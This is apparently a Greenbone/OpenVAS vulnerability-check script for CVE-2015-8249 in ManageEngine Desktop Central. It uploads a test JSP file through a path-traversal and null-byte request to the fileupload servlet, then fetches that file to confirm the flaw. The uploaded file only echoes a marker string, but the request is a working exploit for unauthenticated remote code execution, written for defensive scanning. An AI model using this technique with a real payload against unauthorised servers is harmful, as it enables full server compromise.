CPE = "cpe:/a:zohocorp:manageengine_desktop_central";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140041" );
	script_cve_id( "CVE-2015-8249" );
	script_version( "2021-09-23T06:03:53+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2021-09-23 06:03:53 +0000 (Thu, 23 Sep 2021)" );
	script_tag( name: "creation_date", value: "2016-11-01 16:26:16 +0100 (Tue, 01 Nov 2016)" );
	script_name( "ManageEngine Desktop Central < 9.0.142 FileUploadServlet connectionId Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_manage_engine_desktop_central_http_detect.sc" );
	script_mandatory_keys( "manageengine/desktop_central/http/detected" );
	script_require_ports( "Services/www", 8020 );
	script_tag( name: "impact", value: "Successful exploitation will allow an attacker to gain arbitrary
  code execution on the server." );
	script_tag( name: "affected", value: "ManageEngine Desktop Central prior to version 9.0.142." );
	script_tag( name: "solution", value: "Update to version 9.0.142 or later." );
	script_tag( name: "vuldetect", value: "Try to upload a jsp file." );
	script_tag( name: "summary", value: "ManageEngine Desktop Central 9 suffers from a vulnerability that
  allows a remote attacker to upload a malicious file, and execute it under the context of SYSTEM." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
host = http_host_name( port: port );
vtstrings = get_vt_strings();
vt_string = vtstrings["default"];
str = vt_string + "_CVE-2015-8249_" + rand();
postdata = "<%= new String(\"" + str + "\") %>";
file = vt_string + "_CVE-2015-8249_test.jsp";
url = dir + "/fileupload?connectionId=AAAAAAA%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cjspf%5c" + file + "%00&resourceId=B&action=rds_file_upload&computerName=" + vt_string + "%2ephp&customerId=47474747";
req = http_post_put_req( port: port, url: url, data: postdata, add_headers: make_array( "Content-Type", "application/octet-stream" ) );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!buf || !IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" )){
	exit( 99 );
}
url = dir + "/jspf/" + file;
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( buf, str )){
	report = "It was possible to upload the file `" + http_report_vuln_url( url: url, port: port, url_only: TRUE ) + "`. Please delete this file.\n\n";
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

